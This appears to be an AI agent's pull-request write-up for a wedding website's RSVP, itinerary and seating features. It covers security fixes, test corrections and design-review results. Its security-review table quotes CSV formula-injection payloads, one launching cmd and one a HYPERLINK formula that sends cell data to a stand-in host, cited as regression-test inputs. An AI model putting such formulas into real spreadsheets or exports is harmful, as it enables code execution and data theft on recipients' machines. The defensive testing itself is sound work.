# PR 07 — RSVP, Your Weekend, seating

Level **07** of 17. Base: `main` (level 06 merged as `701e05c`).

## 1. Hostile-reviewer pass

*What is the worst thing a reviewer could say about this diff?*

**"Your security suites never ran, and you shipped a CSRF hole behind them."** Correct, and it is
the finding of this level. `tests/security/**` — five suites covering IDOR, OTP enumeration and
brute force, invitation replay and revoke, session fixation and CSRF — had never executed in CI:
the e2e job filtered to `tests/e2e`. They existed, they passed on their author's machine, and the
level-06 PR body cited them as evidence. Standing up a server they could actually run against
surfaced a real defect in the first attempt: `POST /api/auth/sign-out` accepted any origin, so any
site could force a signed-in guest out. Fixed at the route; the suites now run in CI; and a build
guard makes "a spec that no step runs" a failing build rather than a silent gap.

**"You verified in configurations that could not fail."** Also fair, twice on this branch before I
caught the pattern. Recorded in §4 rather than smoothed over.

**"This level is large."** 91 files. It is one coherent surface (events, RSVP, Your Weekend,
seating) plus the integration work to put it on the real identity schema, and it is the level the
brief asks for before travel and media can mean anything.

## 1b. Correction to the level-06 self-review

The level-06 self-review states that the remaining `localhost:3NNN` literals were "unit and
integration tests building synthetic `Request` objects … self-consistent and carry no port
dependency." **That was wrong.** I ran `grep | head -20` over 26 matches and generalised from the
visible ones. Four of the six I did not look at were in `tests/security/*.spec.ts` — real-server
specs carrying the identical hardcoded-origin defect I had just fixed in the passkey journey.

The worst of them was the CSRF test's positive control:

```ts
cap(..., { cookie, origin: 'https://evil.example' })    // expect 401 — passes on any port
cap(..., { cookie, origin: 'http://localhost:3106' })   // expect 200 — only on port 3106
```

On any other port the second call also returned 401, so the test passed while no longer
distinguishing a working CSRF check from a site that rejects everything. All four now resolve the
origin the way `playwright.config.ts` does; no hardcoded port remains in any real-server spec.

## 2. Authorization table

| Capability | Kind | Auth + entitlement | IDOR test | Result |
|---|---|---|---|---|
| `list_my_events` | read | guest · `view_event` | `tests/integration/rsvp.test.ts` scope-to-`actsFor` | pass |
| `get_my_rsvp` | read | guest · `rsvp_self` | cross-household read refused; entitled admin refused by the handler guard | pass |
| `draft_rsvp` | draft | guest · `rsvp_self` | attendee injection from another household refused | pass |
| `submit_rsvp` | transaction | guest · `rsvp_self` · UI-only | confirmation token bound to principal + payload + surface | pass |
| `get_my_itinerary` | read | guest · `view_private_schedule` | entitled admin refused by the handler guard | pass |
| `get_my_table` / `show_my_table_on_floorplan` | read | guest · `view_table_assignment` | unpublished chart invisible; `assertActsFor` on the one input naming a guest | pass |
| 17 × `admin_*` | read/action | admin · `admin_content` and/or `admin_guest_ops` | `admin_list_events` moved to require `admin_guest_ops` (§5) | pass |

The per-role capability snapshot (`tests/integration/identity/resolver.test.ts`) moves 18 → 23 guest
and 17 → 34 admin. Updated deliberately, each addition checked: every new guest capability is
`auth: 'guest'` behind an entitlement, and **the anonymous list is unchanged** — this level exposes
nothing publicly. Two absences are the entitlement gate working rather than omissions, and the
reasoning is recorded beside the assertion for the next level.

## 3. Secrets and PII grep

`guest_needs` (dietary and accessibility free text) is the sensitive data here. It stays out of
logs, audit metadata, idempotency responses, the confirmation e-mail body, and every non-`ui`
surface. `draft_rsvp` used to echo it back on the `ai`/`webmcp` surfaces; it no longer does,
matching `get_my_rsvp`, and its confirmation token is unredeemable off the website anyway. `.env`
untouched. No new secret material.

## 4. Tests — and two I proved were not testing what they claimed

Unit 242, integration 100, e2e/security 215 across two arrangements. Additions:

- **CSV formula injection** (`tests/unit/rsvp/csv-export.test.ts`) with the exact payloads I
  measured reaching the planner's download raw. Fails 7 of 8 without the guard.
- **Seating capacity under concurrency** — exactly one of two simultaneous saves takes the last
  seat. Without the in-transaction check both succeed and overfill the table.
- **Pipeline rate limit** — the budget is refused once spent, and absent for in-process callers.
  Fails without the consume in `invoke`.
- **Test-principal gate** — disabled outside `NODE_ENV=test`, without a secret, with a short
  secret, on a wrong secret, on a missing header, on unparseable JSON. The positive case genuinely
  injects; my first version used a non-ULID id, which made it fail and would have left every
  negative passing for the wrong reason.

**Two existing tests did not exercise their guard.** `tests/integration/weekend.test.ts:69` and
`tests/integration/rsvp.test.ts:185` refused an admin who lacked the entitlement, so `authorize()`
rejected first and the handlers' own `requireGuestPrincipal` never ran. I verified this by deleting
both guards: all five tests still passed. The admins are now entitled, so the guard is what is under
test — with the guards deleted, both tests now fail. That guard is the only thing stopping an
owner-role admin who *does* hold `view_private_schedule` from reading a household's private
itinerary.

**Deliberately not covered:** cross-browser (Chromium only, as configured); the tablet viewport for
the RSVP journey (skipped by the spec's own guard, phone and desktop are the review viewports).

**One flake chased to a real cause.** `tests/security/invitation.spec.ts` failed once with
`no OTP for chidi+…` and passed on retry. It is not a flake to re-run: the dev inbox is one
process-global array, `clearInbox` empties it for **every** address, and `tests/security/otp.spec.ts`
called it while `fullyParallel` runs both files at once — so one file was deleting another worker's
one-time code between its "Send me a code" click and its inbox poll. Reproduced at 1 in 3 runs. The
clear is gone; the assertion it protected now names this run's own ghost address, which is strictly
more precise than the `startsWith('ghost+')` scan it replaces. Four runs since without recurrence,
which is evidence but not proof, so it is stated as that.

## 5. Independent security review, and what I re-measured

An adversarial reviewer read this level's diff. One blocker, eight should-fixes. I re-verified each
finding with my own probes rather than accepting the report:

| Finding | Verified how | Status |
|---|---|---|
| **Blocker** — CSV formula injection: guest-written `dietary`, `accessibility`, plus-one name reach the planner's CSV with a leading `=`/`+`/`-`/`@` | Ran the real `needsToCsv`: `=cmd\|'/c calc'!A1` arrived raw; `=HYPERLINK("https://evil.test/?d="&A2,"Menu")` survived quoting, because Excel strips CSV quotes before deciding a cell is a formula | fixed + regression test |
| `admin_list_events` returns the whole roster behind `admin_content` alone | Read the descriptor and output; the branch's own test defines the content-only planner persona it breaks | requires `admin_guest_ops` |
| CSV export route leaked entitlement names the JSON route strips | Read both error paths | stripped |
| Weekend slot `href` unvalidated into `<a href>` | Read the schema and the component | constrained to relative or `https` |
| `draft_rsvp` echoed needs text to assistants | Read the output construction; confirmed the token is unredeemable off `ui` | trimmed off-`ui` |
| Server actions bypass the rate limiter | Read `uiContext` → `createCapabilityContext`; no limiter wired | budget moved into `invoke` |
| Unbounded CSV table names | Read `parseSeatingCsv` against `admin_upsert_table`'s cap | capped to match |
| Two admin read-then-write races | Read both call sites | both folded into their transactions |
| Two tests that pass without their guard | Deleted the guards; tests still passed | fixed, re-proved |

Not accepted as a code change: **tablemate names cross household lines by design** — a guest sees
who else is at their table. That is what the descriptor advertises and what a seating chart is, but
it is the one place a guest learns another household's placement, so it belongs to Tyler and Sara as
a product decision, not to me. Raised in the content backlog rather than silently changed.

## 6. Design verdict per theme

Three review rounds ran on `/rsvp` and `/your-weekend` in both designs. Round 3
(`docs/design/critiques/2026-09-06-rsvp-your-weekend-round3.md`) returned **FIX FIRST** — Design 5,
Usability 6, Creativity 4, Content 5, identical in both designs — with three blockers. All three are
fixed, each measured in the condition that could fail:

| Blocker | What it was | Fixed by | Proof it was real |
|---|---|---|---|
| Running copy unthemed without script | `globals.css` declared `background`/`color`/`font-family` on `html` alone, but **no element carrying `[data-theme]` is at or above `html`** — the public shell and the guest layout both put it on a div inside `<body>`, and `theme.css` scopes `--font-text` to `[data-theme="<id>"]`. The declaration had been invalid at computed-value time on every route since the theme engine landed; the public pages hid it because each theme kit sets fonts on its own elements | selector widened to `html, [data-theme]`, and the dead duplicate dropped from `body` | With the old selector, **12 of 14** text elements on `/rsvp` and **55 of 66** on `/your-weekend` compute to Times New Roman with script disabled, both designs; with the fix, 0 of 80 across 8 route × design × script combinations |
| `/rsvp` contradicted itself when closed | the lede branched on `deadlineAt` alone, printing "…while RSVPs are open" directly above the form's "RSVPs are closed" | branch on `window.open`, exactly as `WeekendPage` already did | A **fresh boot seeds this state** (`mode: 'auto'` under lifecycle TEASER → `open:false, deadlineAt:null`), verified against a restarted server — it was the first thing a guest read, not an edge case |
| `/rsvp` never named the deadline, and printed the fallback twice | route and `RsvpForm` both emitted it | the route names the gap with `<Placeholder inline>`; the form keeps only the sentence that is true while open | asserted at exactly one occurrence per page, and that both pages now say the same thing |

Also fixed, from the same round and beyond it: the orphaned `·` separator on `/your-weekend`
(one fact per line instead of a middot that landed alone on a phone line), and — not reported, found
while reading the closed state — the heading asking "Ada, will you join us?" above "RSVPs are
closed", the same defect as the lede one element up.

Two of the round's other findings landed as collateral repairs rather than as design changes: giving
the guest wrapper the shared `site` class restored the themed background and closed a **print** gap
the reviewer noticed in passing (`print.css` scopes every rule to `.site`, so the guest nav had been
printing on every page).

Three regression tests were added and **each was proved to fail without its fix**, not merely to
pass with it: the script-disabled theming test reports 74 unthemed elements when the selector is
reverted; the closed-window test's own failure output contains the contradiction verbatim; the
deadline test finds 0 occurrences instead of 1.

**Not fixed, recorded instead:** `/rsvp` in its closed state shows two placeholders for the same
missing fact — the closed notice's "their contact details" and the footer's "how to reach us with a
question". Each is correct alone; together they read as one gap reported twice. It belongs to the
content backlog (one contact fact), not to a component change made on my own judgement.

## 7. Accessibility and performance

`/rsvp` and `/your-weekend` are audited with axe **with a real session**, at phone and desktop
widths, and mid-journey rather than only on load (`tests/e2e/rsvp.spec.ts`). The public `a11y.spec.ts`
route list deliberately does **not** include them: they are guest-gated as of level 06, so an
anonymous visit redirects to `/sign-in` and axe would audit the sign-in page under a test named for
the RSVP page. Inputs are asserted labelled and ≥17px so phones do not zoom.

## 8. Docs and ADRs

`docs/architecture/` gains this level's notes from the swarm. The stale "contract change requested
from Swarm D" comment in `src/domain/rsvp/email.ts` is corrected: level 06 delivered `sendMessage`,
so both shipped providers can now send, and the degraded path is kept for a provider seam that
cannot.

## 9. TODO inventory

Unchanged in kind: event names, descriptions and the RSVP deadline remain `TODO(Tyler & Sara)`
placeholders with `placeholder: true`. No invented wedding facts. The content backlog gains the
tablemate-visibility question.

## 9b. Two things I got wrong this round, and how they were caught

Both were caught by measuring rather than by reasoning, and both are recorded because the reasoning
was confident and wrong.

1. **A "66 of 66 unthemed" reading that was an artifact.** My first script-disabled probe reported
   `/your-weekend` fully unthemed while `/rsvp` was clean — from one layout. The difference was that
   `/your-weekend` was the first navigation in each browser context and `domcontentloaded` does not
   wait for stylesheets. Re-measured with the routes warmed, on `load`, and with a fresh context per
   measurement, it was 0. Had I trusted it I would have "fixed" a second, non-existent bug.

2. **A rate-limit defect I reported to myself and then disproved.** Chasing repeated `429`s I found
   `principalKey` collapses every anonymous caller to the literal `anonymous`, and concluded that
   moving the limiter into `invoke()` (finding S5) had given the whole public site one shared
   budget — a denial of service anyone could trigger. I wrote the guard and a test. **The test
   passed without the guard**, which is the tell: `src/app/api/capabilities/[name]/route.ts` already
   sets `rateLimit: principal.kind !== 'anonymous'` and meters anonymous callers per client IP, with
   that same reasoning in a comment. Both the change and its unfalsifiable test were reverted. The
   real cause of the `429`s was my own measurement environment: `forwardedFor` maps every seed into
   200 synthetic addresses, and a dozen repeated runs against one long-lived dev server drained
   buckets that refill at 60 per ten minutes. CI starts a fresh server and runs each list once.

That 200-address space is a latent flake source as the suites grow, and widening it is a one-line
change — but the per-email-limit test reaches its `429` within seven calls by way of the buckets that
space produces, so widening it without re-deriving that test's arithmetic would trade a hypothetical
flake for a real one. Left alone deliberately, and written down here for the level that has cause to
touch it.

## 10. Verdict

**READY.** The design review on the two new guest surfaces has run three rounds; round 3's three
blockers are fixed and each fix is proved by a test that fails without it.

`npm run verify` green in its log; both CI arrangements verified locally before pushing rather than
discovered in CI. The migration was regenerated from the merged schema (`0004`), creates no identity
tables, and its six foreign keys point at level 06's real ones.
